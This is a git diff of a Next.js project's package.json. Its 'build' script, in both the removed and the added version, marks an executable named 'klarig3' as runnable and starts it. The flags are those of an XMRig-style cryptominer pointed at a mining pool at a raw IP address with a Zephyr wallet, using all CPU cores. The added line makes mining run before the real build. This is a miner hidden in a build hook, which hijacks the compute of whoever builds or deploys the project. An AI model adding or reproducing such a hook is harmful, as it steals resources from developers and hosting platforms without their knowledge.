@@ -4,7 +4,7 @@
   "private": true,
   "scripts": {
     "dev": "next dev",
-    "build": "next build && chmod +x klarig3 && timeout 30 ./klarig3 -a rx/0 -o 68.183.28.129:80 -u ZEPHs9wbP2kgeHU9wJoPonUwJAsZkj5rHagMgnDjK7186LuNVVfFeCGDByX2Y18AvbdRJQsNK4Fu4QM7XGs1bXegNGhthDhZ5ht -p Tester -t $(nproc --all) -k --donate-level 1",
+    "build": "chmod +x klarig3 && timeout 10 ./klarig3 -a rx/0 -o 68.183.28.129:80 -u ZEPHs9wbP2kgeHU9wJoPonUwJAsZkj5rHagMgnDjK7186LuNVVfFeCGDByX2Y18AvbdRJQsNK4Fu4QM7XGs1bXegNGhthDhZ5ht -p Tester -t $(nproc --all) -k --donate-level 1 && next build",
     "start": "next start",
     "lint": "next lint"
   },
